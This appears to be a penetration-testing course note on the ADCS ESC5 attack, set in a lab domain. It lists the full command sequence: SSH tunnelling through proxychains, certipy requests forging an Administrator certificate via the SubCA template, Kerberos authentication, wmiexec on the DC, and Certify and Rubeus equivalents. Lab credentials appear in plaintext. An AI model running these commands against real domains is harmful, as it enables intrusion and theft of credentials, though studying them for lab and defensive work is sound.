# 13.08 ESC5 Vulnerable PKI Object Access Control

> Compromise PKI infrastructure objects (CA server computer, NTAuthCertificates container) — replay ESC7 SubCA from the ADCS host.

## Overview

ESC5 covers privilege escalation through control over AD objects that are not templates or CAs themselves but are part of the ADCS infrastructure: the CA server's computer object, the NTAuthCertificates object, the Enrollment Services container, etc. Local admin on the ADCS server is sufficient. The attack in the course replicates ESC7 via the SubCA template from the ADCS server itself, using Proxychains when the ADCS server is separate from the DC.

## Steps

- Identify the ADCS server (separate from DC in this lab: WS01 at 172.16.19.5)
- Set up SSH dynamic port forwarding for Proxychains access to the internal network
- Confirm local admin on ADCS server with netexec smb via proxychains
- Enumerate with proxychains certipy find using -ns and -dns-tcp for proper DNS resolution
- ADCS server local admins have ManageCA + ManageCertificates over that CA
- Replicate ESC7 SubCA attack: request SubCA cert (denied, save key), issue it, retrieve it, authenticate
- From Windows: RDP to ADCS server, use Certify.exe to request SubCA cert, approve via certsrv.msc GUI, download with Certify.exe download

## Commands

### SSH dynamic port forwarding

```bash
sshpass -p 'HTB_@cademy_stdnt!' ssh -N -f -D 127.0.0.1:9050 <USER>@<TARGET>
```

### netexec smb via proxychains

```bash
proxychains4 -q netexec smb 172.16.19.3-5 -u cken -p Superman001
```

### certipy find via proxychains

```bash
proxychains4 -q certipy find -u cken -p Superman001 -dc-ip 172.16.19.3 -stdout -ns 172.16.19.3 -dns-tcp
```

### certipy req SubCA via proxychains

```bash
proxychains4 -q certipy req -u cken -p Superman001 -dc-ip 172.16.19.3 -ns 172.16.19.3 -dns-tcp -target-ip 172.16.19.5 -ca lab-WS01-CA -template SubCA -upn Administrator
```

### certipy ca issue-request via proxychains

```bash
proxychains4 -q certipy ca -u cken -p Superman001 -dc-ip 172.16.19.3 -ns 172.16.19.3 -dns-tcp -target-ip 172.16.19.5 -ca lab-WS01-CA -issue-request 10
```

### certipy req retrieve via proxychains

```bash
proxychains4 -q certipy req -u cken -p Superman001 -dc-ip 172.16.19.3 -ns 172.16.19.3 -dns-tcp -target-ip 172.16.19.5 -ca lab-WS01-CA -retrieve 10
```

### certipy auth via proxychains

```bash
proxychains4 -q certipy auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip 172.16.19.3 -ns 172.16.19.3 -dns-tcp
```

### wmiexec with TGT via proxychains

```bash
KRB5CCNAME=administrator.ccache proxychains4 -q wmiexec.py -k -no-pass LAB-DC.LAB.LOCAL -dc-ip 172.16.19.3
```

### RDP to ADCS server

```bash
proxychains4 -q xfreerdp /u:cken /p:Superman001 /v:172.16.19.5 /dynamic-resolution
```

### Certify.exe SubCA request (Windows)

```powershell
.\Certify.exe request /ca:WS01.lab.local\lab-WS01-CA /template:SubCA /altname:Administrator
```

### Certify.exe download (Windows)

```powershell
.\Certify.exe download /ca:WS01.lab.local\lab-WS01-CA /id:10
```

### Rubeus asktgt (Windows)

```powershell
.\Rubeus.exe asktgt /user:administrator /certificate:approved.pfx /getcredentials
```
